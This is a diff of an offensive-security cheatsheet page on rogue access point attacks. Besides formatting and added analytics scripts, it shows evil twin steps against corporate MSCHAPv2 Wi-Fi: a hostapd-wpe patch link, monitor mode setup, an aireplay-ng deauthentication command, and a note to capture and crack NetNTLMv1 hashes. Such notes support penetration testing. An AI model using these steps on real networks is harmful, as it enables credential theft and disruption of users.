@@ -5,7 +5,7 @@
     
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="revised" content="2022-09-11T16:52:52 CEST">
+<meta name="revised" content="2023-02-14T12:07:01 CET">
 <title>Rogue AP Attack :: Offensive Security Cheatsheet</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
@@ -27,7 +27,36 @@
     
       <header>
   <div class="logo">
-    <a class="baselink" href="/">Offensive Security Cheatsheet</a>
+    <head>
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'G-Q5C993721K', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'G-Q5C993721K', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+</head>
+<a class="baselink" href="/">Offensive Security Cheatsheet</a>
+
   </div>
   <div class="burger"><a href="javascript:void(0);" style="font-size:15px;">&#9776;</a></div>
     <nav class="shortcuts">
@@ -1805,17 +1834,16 @@
     
     
     
-    
-
-<h3 id="general-informations">General Informations</h3>
+    <h3 id="general-informations">General Informations</h3>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># If you need several external eth interfaces, connect then at the beginning</span>
 <span style="color:#75715e"># To ensure having wlan0 and wlan1</span>
 <span style="color:#75715e"># And avoid having wlan0mon and then wlan0 when you connect the second one</span>
-<span style="color:#75715e"># It could result in conflicts</span></code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Evil Twin / Hostapd-wpe is used against MSCHAPv2 access points, usually used by companies</span>
-<span style="color:#75715e"># Manually creating a rogue AP for classical WPA/WPA2 requires more configuration</span></code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># You might need to patch your hostapd version</span>
-https://github.com/aircrack-ng/aircrack-ng/tree/master/patches/wpe/hostapd-wpe</code></pre></div>
-<p><br/></p>
-
+<span style="color:#75715e"># It could result in conflicts</span>
+</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Evil Twin / Hostapd-wpe is used against MSCHAPv2 access points, usually used by companies</span>
+<span style="color:#75715e"># Manually creating a rogue AP for classical WPA/WPA2 requires more configuration</span>
+</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># You might need to patch your hostapd version</span>
+https://github.com/aircrack-ng/aircrack-ng/tree/master/patches/wpe/hostapd-wpe
+</code></pre></div><!-- raw HTML omitted -->
 <h3 id="evil-twin-attack">Evil Twin attack</h3>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># 1/ Start monitoring mode</span>
 <span style="color:#75715e"># If you plan to use deauth attack, connect the 2 eth interfaces at the same time</span>
@@ -1849,8 +1877,8 @@ sudo airmon-ng start wlan1
 sudo aireplay-ng -0 <span style="color:#ae81ff">10</span> -a &lt;mac address&gt; -c &lt;channel&gt;
 
 <span style="color:#75715e"># Then wait for credz \o/</span>
-<span style="color:#75715e"># You will probably get NetNTLMv1 hashes you will need to crack</span></code></pre></div>
-<p><br/></p>
+<span style="color:#75715e"># You will probably get NetNTLMv1 hashes you will need to crack</span>
+</code></pre></div><!-- raw HTML omitted -->
 
 
     
